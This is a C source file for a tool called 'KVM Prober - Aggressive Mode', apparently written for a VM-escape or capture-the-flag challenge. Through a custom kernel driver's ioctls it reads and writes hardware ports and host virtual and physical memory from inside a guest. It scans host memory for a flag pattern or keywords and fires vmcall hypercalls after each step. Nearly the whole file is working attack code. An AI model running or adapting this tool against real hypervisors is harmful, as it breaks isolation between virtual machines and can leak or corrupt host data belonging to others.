#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <stdint.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

/* IOCTLs - SAME */
#define IOCTL_READ_PORT        0x1001
#define IOCTL_WRITE_PORT       0x1002
#define IOCTL_READ_HOST_MEM    0x1016
#define IOCTL_WRITE_HOST_MEM   0x1017
#define IOCTL_READ_HOST_PHYS   0x1018
#define IOCTL_WRITE_HOST_PHYS  0x1019

/* Gold pattern - SAME */
#define GOLD_PATTERN_LO 0x44434241
#define GOLD_PATTERN_HI 0xefbeadde
#define GOLD_PATTERN    0xefbeadde44434241ULL

/* Structures - SAME */
struct host_mem_access {
    unsigned long host_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct host_phys_access {
    unsigned long host_phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

/* Global state - SAME */
static int g_fd = -1;
static int g_gold_enabled = 0;
static const char *g_keywords = NULL;
static unsigned char g_read_buffer[65536];

/* ========================================================================
 * Hypercall Macros - UPDATED FOR AGGRESSIVE OPERATIONS
 * ======================================================================== */

#define HYPERCALL_100() \
    do { \
        asm volatile("vmcall" : : "a"(100) : "rcx", "r11"); \
    } while(0)

#define HYPERCALL_102_CAPTURE(result) \
    do { \
        unsigned long __result; \
        asm volatile("vmcall" : "=a"(__result) : "a"(102) : "rcx", "r11"); \
        result = __result; \
    } while(0)

/* ========================================================================
 * Helper Functions - UPDATED
 * ======================================================================== */

unsigned long parse_hex(const char *str) {
    return strtoul(str, NULL, 16);
}

unsigned long parse_decimal(const char *str) {
    return strtoul(str, NULL, 10);
}

/* Check for gold pattern - SAME */
int check_gold_pattern(const unsigned char *data, unsigned long len, unsigned long base_addr) {
    int found = 0;

    for (unsigned long i = 0; i < len - 7; i++) {
        uint64_t *ptr = (uint64_t *)(data + i);
        if (*ptr == GOLD_PATTERN) {
            printf("[GOLD] Found pattern at address: 0x%lx\n", base_addr + i);
            found = 1;
        }
    }

    return found;
}

/* Check keywords - SAME */
int check_keywords(const unsigned char *data, unsigned long len, const char *keywords) {
    if (!keywords) return 0;

    char *kw_str = strdup(keywords);
    char *kw = strtok(kw_str, ",");
    int found = 0;

    while (kw) {
        size_t kw_len = strlen(kw);
        for (unsigned long i = 0; i < len - kw_len; i++) {
            if (memcmp(data + i, kw, kw_len) == 0) {
                found = 1;
                goto done;
            }
        }
        kw = strtok(NULL, ",");
    }

done:
    free(kw_str);
    return found;
}

/* Print buffer - SAME */
void print_buffer_formatted(const unsigned char *buf, unsigned long len, unsigned long addr) {
    printf("Address: 0x%lx | Length: %lu\n", addr, len);
    printf("HEX: ");

    for (unsigned long i = 0; i < len; i++) {
        printf("%02X", buf[i]);
        if ((i + 1) % 16 == 0 && i + 1 < len) printf(" ");
    }
    printf("\n");

    printf("ASCII: ");
    for (unsigned long i = 0; i < len; i++) {
        unsigned char c = buf[i];
        printf("%c", (c >= 32 && c <= 126) ? c : '.');
        if ((i + 1) % 16 == 0 && i + 1 < len) printf(" ");
    }
    printf("\n");
}

/* ========================================================================
 * Command Handlers - UPDATED FOR AGGRESSIVE DRIVER
 * ======================================================================== */

void handle_readport(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "readport <port_hex> <size_bytes>\n");
        return;
    }

    struct port_io_data data;
    data.port = (unsigned short)parse_hex(argv[2]);
    data.size = (unsigned int)parse_decimal(argv[3]);

    if (ioctl(g_fd, IOCTL_READ_PORT, &data) < 0) {
        perror("ioctl READ_PORT failed");
        return;
    }

    /* Hypercall after aggressive port read */
    HYPERCALL_102_CAPTURE(data.value);
    if (data.value) {
        printf("[HYPERCALL] Response: 0x%lx\n", (unsigned long)data.value);
    }

    printf("Port 0x%X (size %u) Value: 0x%X\n", data.port, data.size, data.value);
}

void handle_writeport(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "writeport <port_hex> <value_hex> <size_bytes>\n");
        return;
    }

    struct port_io_data data;
    data.port = (unsigned short)parse_hex(argv[2]);
    data.value = (unsigned int)parse_hex(argv[3]);
    data.size = (unsigned int)parse_decimal(argv[4]);

    if (ioctl(g_fd, IOCTL_WRITE_PORT, &data) < 0) {
        perror("ioctl WRITE_PORT failed");
        return;
    }

    /* Hypercall after aggressive port write */
    unsigned long hc_result = 0;
    HYPERCALL_102_CAPTURE(hc_result);
    if (hc_result) {
        printf("[HYPERCALL] Response: 0x%lx\n", hc_result);
    }

    printf("Wrote 0x%X to port 0x%X (size %u)\n", data.value, data.port, data.size);
}

void handle_readhostmem(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "readhostmem <host_vaddr_hex> <num_bytes>\n");
        return;
    }

    struct host_mem_access req;
    req.host_addr = parse_hex(argv[2]);
    req.length = parse_decimal(argv[3]);

    if (req.length > 65536) {
        fprintf(stderr, "Length too large (max 65536)\n");
        return;
    }

    req.user_buffer = g_read_buffer;

    if (ioctl(g_fd, IOCTL_READ_HOST_MEM, &req) < 0) {
        perror("ioctl READ_HOST_MEM failed");
        return;
    }

    /* Hypercall after aggressive memory read */
    unsigned long hc_result = 0;
    HYPERCALL_102_CAPTURE(hc_result);
    if (hc_result) {
        printf("[HYPERCALL] Response: 0x%lx\n", hc_result);
    }

    /* Always check for gold pattern */
    int gold_found = check_gold_pattern(g_read_buffer, req.length, req.host_addr);

    if (g_gold_enabled) {
        if (gold_found || (g_keywords && check_keywords(g_read_buffer, req.length, g_keywords))) {
            print_buffer_formatted(g_read_buffer, req.length, req.host_addr);
        }
    } else {
        print_buffer_formatted(g_read_buffer, req.length, req.host_addr);
    }
}

void handle_writehostmem(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "writehostmem <host_vaddr_hex> <hex_string_to_write>\n");
        return;
    }

    struct host_mem_access req;
    req.host_addr = parse_hex(argv[2]);

    /* Simple hex string conversion */
    const char *hex_str = argv[3];
    size_t hex_len = strlen(hex_str);
    if (hex_len % 2 != 0) {
        fprintf(stderr, "Hex string must have even length\n");
        return;
    }

    req.length = hex_len / 2;
    if (req.length > 65536) {
        fprintf(stderr, "Data too large (max 65536 bytes)\n");
        return;
    }

    for (size_t i = 0; i < req.length; i++) {
        sscanf(hex_str + 2*i, "%2hhx", &g_read_buffer[i]);
    }

    req.user_buffer = g_read_buffer;

    if (ioctl(g_fd, IOCTL_WRITE_HOST_MEM, &req) < 0) {
        perror("ioctl WRITE_HOST_MEM failed");
        return;
    }

    /* Hypercall after aggressive memory write */
    unsigned long hc_result = 0;
    HYPERCALL_102_CAPTURE(hc_result);
    if (hc_result) {
        printf("[HYPERCALL] Response: 0x%lx\n", hc_result);
    }

    printf("Wrote %lu bytes to host memory 0x%lx\n", req.length, req.host_addr);
}

void handle_readhostphys(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "readhostphys <host_paddr_hex> <num_bytes>\n");
        return;
    }

    struct host_phys_access req;
    req.host_phys_addr = parse_hex(argv[2]);
    req.length = parse_decimal(argv[3]);

    if (req.length > 65536) {
        fprintf(stderr, "Length too large (max 65536)\n");
        return;
    }

    req.user_buffer = g_read_buffer;

    if (ioctl(g_fd, IOCTL_READ_HOST_PHYS, &req) < 0) {
        perror("ioctl READ_HOST_PHYS failed");
        return;
    }

    /* Hypercall after aggressive physical memory read */
    unsigned long hc_result = 0;
    HYPERCALL_102_CAPTURE(hc_result);
    if (hc_result) {
        printf("[HYPERCALL] Response: 0x%lx\n", hc_result);
    }

    int gold_found = check_gold_pattern(g_read_buffer, req.length, req.host_phys_addr);

    if (g_gold_enabled) {
        if (gold_found || (g_keywords && check_keywords(g_read_buffer, req.length, g_keywords))) {
            print_buffer_formatted(g_read_buffer, req.length, req.host_phys_addr);
        }
    } else {
        print_buffer_formatted(g_read_buffer, req.length, req.host_phys_addr);
    }
}

void handle_writehostphys(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "writehostphys <host_paddr_hex> <hex_string_to_write>\n");
        return;
    }

    struct host_phys_access req;
    req.host_phys_addr = parse_hex(argv[2]);

    const char *hex_str = argv[3];
    size_t hex_len = strlen(hex_str);
    if (hex_len % 2 != 0) {
        fprintf(stderr, "Hex string must have even length\n");
        return;
    }

    req.length = hex_len / 2;
    if (req.length > 65536) {
        fprintf(stderr, "Data too large (max 65536 bytes)\n");
        return;
    }

    for (size_t i = 0; i < req.length; i++) {
        sscanf(hex_str + 2*i, "%2hhx", &g_read_buffer[i]);
    }

    req.user_buffer = g_read_buffer;

    if (ioctl(g_fd, IOCTL_WRITE_HOST_PHYS, &req) < 0) {
        perror("ioctl WRITE_HOST_PHYS failed");
        return;
    }

    /* Hypercall after aggressive physical memory write */
    unsigned long hc_result = 0;
    HYPERCALL_102_CAPTURE(hc_result);
    if (hc_result) {
        printf("[HYPERCALL] Response: 0x%lx\n", hc_result);
    }

    printf("Wrote %lu bytes to host physical memory 0x%lx\n", req.length, req.host_phys_addr);
}

void handle_scanhostmem(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "scanhostmem <start_vaddr_hex> <end_vaddr_hex> <step_bytes> [--gold [keywords]]\n");
        return;
    }

    unsigned long start = parse_hex(argv[2]);
    unsigned long end = parse_hex(argv[3]);
    unsigned long step = parse_decimal(argv[4]);

    for (unsigned long addr = start; addr < end; addr += step) {
        struct host_mem_access req;
        req.host_addr = addr;
        req.length = step;
        req.user_buffer = g_read_buffer;

        if (ioctl(g_fd, IOCTL_READ_HOST_MEM, &req) < 0) {
            if (!g_gold_enabled) {
                printf("0x%lx: ERROR\n", addr);
            }
            continue;
        }

        /* Hypercall after each aggressive memory read */
        unsigned long hc_result = 0;
        HYPERCALL_102_CAPTURE(hc_result);
        if (hc_result) {
            printf("[HYPERCALL] Response at 0x%lx: 0x%lx\n", addr, hc_result);
        }

        int gold_found = check_gold_pattern(g_read_buffer, step, addr);

        if (g_gold_enabled) {
            if (gold_found || (g_keywords && check_keywords(g_read_buffer, step, g_keywords))) {
                print_buffer_formatted(g_read_buffer, step, addr);
            }
        } else {
            print_buffer_formatted(g_read_buffer, step, addr);
        }
    }
}

void handle_scanhostphys(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "scanhostphys <start_paddr_hex> <end_paddr_hex> <step_bytes> [--gold [keywords]]\n");
        return;
    }

    unsigned long start = parse_hex(argv[2]);
    unsigned long end = parse_hex(argv[3]);
    unsigned long step = parse_decimal(argv[4]);

    for (unsigned long addr = start; addr < end; addr += step) {
        struct host_phys_access req;
        req.host_phys_addr = addr;
        req.length = step;
        req.user_buffer = g_read_buffer;

        if (ioctl(g_fd, IOCTL_READ_HOST_PHYS, &req) < 0) {
            if (!g_gold_enabled) {
                printf("0x%lx: ERROR\n", addr);
            }
            continue;
        }

        /* Hypercall after each aggressive physical memory read */
        unsigned long hc_result = 0;
        HYPERCALL_102_CAPTURE(hc_result);
        if (hc_result) {
            printf("[HYPERCALL] Response at 0x%lx: 0x%lx\n", addr, hc_result);
        }

        int gold_found = check_gold_pattern(g_read_buffer, step, addr);

        if (g_gold_enabled) {
            if (gold_found || (g_keywords && check_keywords(g_read_buffer, step, g_keywords))) {
                print_buffer_formatted(g_read_buffer, step, addr);
            }
        } else {
            print_buffer_formatted(g_read_buffer, step, addr);
        }
    }
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s <command> [args...] [--gold [keywords]]\n", prog_name);
    fprintf(stderr, "\nCommands:\n");
    fprintf(stderr, "  readport <port_hex> <size_bytes>\n");
    fprintf(stderr, "  writeport <port_hex> <value_hex> <size_bytes>\n");
    fprintf(stderr, "  readhostmem <host_vaddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writehostmem <host_vaddr_hex> <hex_string>\n");
    fprintf(stderr, "  readhostphys <host_paddr_hex> <num_bytes>\n");
    fprintf(stderr, "  writehostphys <host_paddr_hex> <hex_string>\n");
    fprintf(stderr, "  scanhostmem <start_vaddr_hex> <end_vaddr_hex> <step_bytes> [--gold [keywords]]\n");
    fprintf(stderr, "  scanhostphys <start_paddr_hex> <end_paddr_hex> <step_bytes> [--gold [keywords]]\n");
    fprintf(stderr, "\nOptions:\n");
    fprintf(stderr, "  --gold              : Only output if 0x44434241efbeadde found\n");
    fprintf(stderr, "  --gold <keywords>   : Filter by keywords (comma-separated) OR gold pattern\n");
    fprintf(stderr, "\nAGGRESSIVE MODE NOTES:\n");
    fprintf(stderr, "  - Driver uses multiple fallback methods for memory access\n");
    fprintf(stderr, "  - Some operations may fail or cause system instability\n");
    fprintf(stderr, "  - Hypercalls executed after each operation\n");
    fprintf(stderr, "  - Gold pattern always searched and logged to kernel on finds\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    printf("KVM Prober - Aggressive Mode Enabled\n");
    printf("WARNING: This may cause system instability\n\n");

    /* Parse --gold flag from anywhere in argv */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--gold") == 0) {
            g_gold_enabled = 1;

            /* Check if keywords follow */
            if (i + 1 < argc && argv[i + 1][0] != '-') {
                g_keywords = argv[i + 1];
            }
            break;
        }
    }

    /* Open device */
    g_fd = open(DEVICE_PATH, O_RDWR);
    if (g_fd < 0) {
        perror("Failed to open " DEVICE_PATH);
        return 1;
    }

    const char *cmd = argv[1];
    int ret = 0;

    if (strcmp(cmd, "readport") == 0) {
        handle_readport(argc, argv);
    } else if (strcmp(cmd, "writeport") == 0) {
        handle_writeport(argc, argv);
    } else if (strcmp(cmd, "readhostmem") == 0) {
        handle_readhostmem(argc, argv);
    } else if (strcmp(cmd, "writehostmem") == 0) {
        handle_writehostmem(argc, argv);
    } else if (strcmp(cmd, "readhostphys") == 0) {
        handle_readhostphys(argc, argv);
    } else if (strcmp(cmd, "writehostphys") == 0) {
        handle_writehostphys(argc, argv);
    } else if (strcmp(cmd, "scanhostmem") == 0) {
        handle_scanhostmem(argc, argv);
    } else if (strcmp(cmd, "scanhostphys") == 0) {
        handle_scanhostphys(argc, argv);
    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        print_usage(argv[0]);
        ret = 1;
    }

    close(g_fd);
    return ret;
}
